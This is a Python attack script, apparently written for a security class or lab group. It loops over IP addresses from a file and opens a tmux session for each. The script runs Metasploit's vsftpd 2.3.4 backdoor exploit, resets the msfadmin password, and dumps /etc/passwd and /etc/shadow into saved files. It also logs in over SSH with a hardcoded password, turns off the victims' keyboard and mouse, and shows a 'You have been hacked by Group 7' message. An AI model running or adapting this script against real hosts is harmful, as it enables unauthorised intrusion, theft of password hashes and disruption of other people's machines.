# Created by Tapas Joshi
# Python script to read the file and get all IP addresses and store it in a list
# SSH to each and every IP address in different terminal

import os
import time
from os import system
import subprocess
import _thread

user = "student"
passwd = "\"student\""


def tmux(command):
    system('tmux %s' % command)


def tmux_shell(command, ses):
    # tmux('send-keys "%s" "C-m"' % command)
    tmux('send-keys -t ' + ses + ' "%s" "C-m"' % command)

with open("ip.txt") as f:
    content = f.readlines()
# Removes whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content]


# tmux('new-window')
# tmux('select-window -t 0')
# tmux_shell('vim')

# os.system("gnome-terminal -e 'bash -c \"ps; exec bash\"'")
# os.system("tmux new -s "+"2"+" -d")
# os.system("tmux new-window cd /etc/")

def msf(task):

    for [index, ip] in enumerate(content):
        # If any tmux server running, kill it
        os.system("tmux kill-server")
        # Start a new tmux session
        os.system("tmux new -s " + str(index) + " -d &")
        # Attach the new tmux session with a new Terminator window
        os.system("terminator -e 'bash -c \"tmux attach -t " + str(index) + "; exec bash\"'&")
        # Run msf console
        tmux_shell('cd /opt/metasploit-framework/', str(index))
        tmux_shell('msfconsole', str(index))

        tmux_shell('use exploit/unix/ftp/vsftpd_234_backdoor', str(index))
        tmux_shell('set RHOST '+ip, str(index))
        tmux_shell('show options', str(index))

        # tmux('capture-pane')
        # stdoutdata = subprocess.getoutput("tmux show-buffer")
        # print("stdoutdata: " + stdoutdata)
        #tmux_shell('show options')
        tmux_shell('exploit', str(index))

        if task == "change_pass":
            tmux_shell('passwd msfadmin', str(index))
            tmux_shell('msfadmin', str(index))
            tmux_shell('msfadmin', str(index))

      #  if task == "get_pass":
       #      tmux_shell('cat /etc/passwd', str(index))

   #     if task == "get_shadow":
    #        tmux_shell('cat /etc/shadow', str(index))
        # print(subprocess.run(['tmux', 'show-buffer'], stdout=subprocess.PIPE).stdout.decode('utf-8'))

def savePass(type, t):
    time.sleep(t)
    print("Wait Complete...Grabbing password files....")
    for [index, ip] in enumerate(content):
        # tmux_shell('tmux show-buffer -t '+index)

        if type == "pass":
            tmux_shell('cat /etc/passwd', str(index))
            time.sleep(5)

        if type == "shadow":
            tmux_shell('cat /etc/shadow', str(index))
            time.sleep(5)

        tmux('capture-pane -t '+str(index))
        print(subprocess.run(['tmux', 'show-buffer'], stdout=subprocess.PIPE).stdout.decode('utf-8'))
        tmux('save-buffer -b buffer0000 /home/profiler/NS/'+str(index)+"_"+type)


# Starts a loop to read ip addresses line by line and then opens ssh session to each IP
def dis_key(action):
    for [index, ip] in enumerate(content):
        print(ip)
        os.system("tmux kill-server")
        # Start a new tmux session
        #os.system("tmux")
        os.system("tmux new -s " + str(index) + "&")
        # Attach the new tmux session with a new Terminator window
        os.system("terminator -e 'bash -c \"tmux attach -t " + str(index) + "; exec bash\"'&")
        # SSH to all the IP addresses
        tmux_shell('sshpass -p ' + passwd + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip, str(index))

        # ifconfig | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'

        tmux_shell('export DISPLAY=:0', str(index))

        for x in range(0, 20):
            if action == "disable":
                tmux_shell('sleep 0.1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 0', str(index))
                if x == 0:
                   tmux_shell('xmessage -center You have been hacked by Group 7 &', str(index))
            elif action == "enable":
                tmux_shell('sleep 0.1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 1 &', str(index))
                if x == 0:
                    tmux_shell('xmessage -center Everything back normal &', str(index))
                    

# 192.168.16.128
dis_key("disable")
#time.sleep(10)
#dis_key("enable")

#msf("get_shadow")
#savePass("shadow", 2)
#msf("get_pass")
#savePass("pass", 2)

